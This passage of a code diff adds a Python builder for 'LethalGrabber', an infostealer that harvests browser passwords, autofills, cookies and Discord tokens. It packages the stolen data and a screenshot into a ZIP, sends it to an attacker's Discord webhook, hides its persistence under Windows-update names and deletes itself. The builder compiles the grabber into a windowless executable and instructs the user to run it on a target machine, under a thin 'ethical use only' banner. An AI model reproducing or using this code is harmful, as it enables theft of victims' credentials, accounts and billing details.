+                "value": f"```yaml\\nPasswords: {pw_count}\\nAutofills: {af_count}\\nCookies: {ck_count}\\nTokens Found: {tk_count}\\nValid Tokens: {valid_count}/{min(tk_count,10)}\\n```",
+                "inline": False
+            })
+
+            if first_valid:
+                ui = first_valid['data']
+                nitro_map = {0:'❌ None',1:'Nitro Classic',2:'Nitro',3:'Nitro Basic'}
+                nitro_icon = nitro_map.get(ui.get('premium_type',0),'❌')
+                mfa_icon = '✅ Yes' if ui.get('mfa_enabled') else '❌ No'
+                verified_icon = '✅' if ui.get('verified') else '❌'
+                
+                discord_field = (
+                    f"```nim\\n"
+                    f"Source: {first_valid['source']}\\n"
+                    f"Username: {ui.get('username','?')}#{ui.get('discriminator','0')}\\n"
+                    f"ID: {ui.get('id','?')}\\n"
+                    f"Email: {ui.get('email','N/A')}\\n"
+                    f"Phone: {ui.get('phone','N/A')}\\n"
+                    f"MFA: {mfa_icon}\\n"
+                    f"Verified: {verified_icon}\\n"
+                    f"Nitro: {nitro_icon}\\n"
+                    f"Billing: {self.get_billing(first_valid['token'])}\\n"
+                    f"```"
+                )
+                embed["fields"].append({
+                    "name": "🎯 **Primary Discord Account**",
+                    "value": discord_field,
+                    "inline": False
+                })
+
+            embed["fields"].append({
+                "name": "📁 **Collection Complete**",
+                "value": "```diff\\n+ ZIP file attached with:\\n  • Credentials/passwords.txt\\n  • Credentials/autofills.txt\\n  • Credentials/cookies.txt\\n  • Credentials/discord_tokens.txt\\n  • Credentials/Messenger/discord_tokens.txt\\n  • screenshot.bmp\\n```",
+                "inline": False
+            })
+
+            browsers_found = [b for b, p in CHROMIUM_BROWSERS.items() if os.path.exists(p)]
+            if browsers_found:
+                embed["fields"].append({
+                    "name": "🌐 **Browsers Scanned**",
+                    "value": f"```\\n{', '.join(browsers_found)}\\n```",
+                    "inline": False
+                })
+
+            with open(zip_path, 'rb') as f:
+                zip_data = f.read()
+            
+            files = {
+                'file': ('LethalGrabber_Data.zip', zip_data, 'application/zip'),
+                'payload_json': (None, json.dumps({
+                    'username': GRABBER_NAME,
+                    'avatar_url': 'https://cdn.discordapp.com/icons/1121520721807155220/135a37a1b97a5cf314c75d8c8e3beb2d.png?size=128',
+                    'embeds': [embed]
+                }))
+            }
+            
+            requests.post(WEBHOOK_URL, files=files, timeout=30)
+            
+        except Exception as e:
+            pass
+
+    def cleanup(self):
+        """Remove traces"""
+        try:
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE) as key:
+                try: winreg.DeleteValue(key, 'WindowsSecurityUpdate')
+                except: pass
+        except: pass
+        
+        try:
+            startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows',
+                'Start Menu', 'Programs', 'Startup', 'WindowsUpdateCheck.bat')
+            if os.path.exists(startup_path):
+                os.remove(startup_path)
+        except: pass
+        
+        try:
+            shutil.rmtree(self.temp_dir, ignore_errors=True)
+        except: pass
+
+        try:
+            exe = sys.executable
+            if exe.endswith('.exe'):
+                bat = os.path.join(tempfile.gettempdir(), 'cleanup.bat')
+                with open(bat, 'w') as f:
+                    f.write(f'@echo off\\n:loop\\ndel /f /q "{exe}" 2>nul\\nif exist "{exe}" goto loop\\ndel /f /q "%~f0"')
+                os.startfile(bat)
+        except: pass
+
+    def run(self):
+        self.install_startup()
+
+        self.extract_passwords()
+        self.extract_autofills()
+        self.extract_cookies()
+        self.extract_firefox_data()
+        self.extract_all_discord_tokens()
+
+        self.send_to_webhook()
+
+        self.cleanup()
+
+
+if __name__ == '__main__':
+    g = LethalGrabber()
+    g.run()
+'''
+    return script_content
+
+
+def build_exe():
+    """Build the exe using PyInstaller"""
+    print_color("\n[+] Building executable with PyInstaller...", 93)
+
+    try:
+        subprocess.check_call(
+            [sys.executable, '-m', 'PyInstaller',
+             '--onefile', '--noconsole', '--name', 'built',
+             '--hidden-import=win32crypt',
+             '--hidden-import=win32gui',
+             '--hidden-import=win32ui',
+             '--hidden-import=win32con',
+             '--hidden-import=win32api',
+             '--hidden-import=win32file',
+             '--hidden-import=win32security',
+             '--hidden-import=win32process',
+             'grabber.py'],
+            timeout=120
+        )
+        print_color("\n[✓] Build complete! Executable located at:", 92)
+        print_color(f"    dist\\built.exe", 96)
+        return True
+    except subprocess.TimeoutExpired:
+        print_color("\n[!] Build timed out. Check your connection and try again.", 91)
+        return False
+    except Exception as e:
+        print_color(f"\n[!] Build failed: {e}", 91)
+        return False
+
+
+def main():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    
+    print_color(BANNER, 91)
+    print_color("="*58, 93)
+    print_color("  Authorized Penetration Testing Tool - Ethical Use Only", 93)
+    print_color("="*58, 93)
+    print()
+
+    if not install_dependencies():
+        print_color("\n[!] Failed to install dependencies. Exiting.", 91)
+        input("\nPress Enter to exit...")
+        return
+
+    print_color("\n[+] Configuration", 93)
+    print_color("    Enter your Discord webhook URL below:", 94)
+    print_color("    (Paste it, then press Enter)", 90)
+    
+    webhook_url = input("\n    Webhook URL > ").strip()
+    
+    while not webhook_url.startswith('https://discord.com/api/webhooks/'):
+        print_color("    [!] Invalid webhook URL. Must start with 'https://discord.com/api/webhooks/'", 91)
+        webhook_url = input("\n    Webhook URL > ").strip()
+    
+    print_color("\n    [✓] Webhook URL accepted!", 92)
+
+    print_color("\n[+] Generating grabber script...", 93)
+    script = create_grabber_script(webhook_url)
+    
+    with open('grabber.py', 'w', encoding='utf-8') as f:
+        f.write(script)
+    
+    print_color("    [✓] grabber.py written successfully!", 92)
+
+    if build_exe():
+        print_color("\n" + "="*58, 92)
+        print_color("  ✓✓✓ BUILD SUCCESSFUL ✓✓✓", 92)
+        print_color("="*58, 92)
+        print_color(f"\n  Output: dist\\built.exe", 96)
+        print_color(f"  Size: ", 94, end='')
+        exe_path = os.path.join('dist', 'built.exe')
+        if os.path.exists(exe_path):
+            size = os.path.getsize(exe_path) / (1024 * 1024)
+            print_color(f"{size:.2f} MB", 92)
+        print()
+
+        for d in ['build', '__pycache__']:
+            shutil.rmtree(d, ignore_errors=True)
+        for f in ['grabber.spec']:
+            try: os.remove(f)
+            except: pass
+        
+        print_color("  Removed build artifacts.", 90)
+        print_color("\n  Your grabber is ready at: dist\\built.exe", 96)
+        print_color("  Run it on the target machine to collect data.", 93)
+    else:
+        print_color("\n[!] Build failed. Check errors above.", 91)
+    
+    print()
+    input("Press Enter to exit...")
+
+
+if __name__ == '__main__':
+    main()
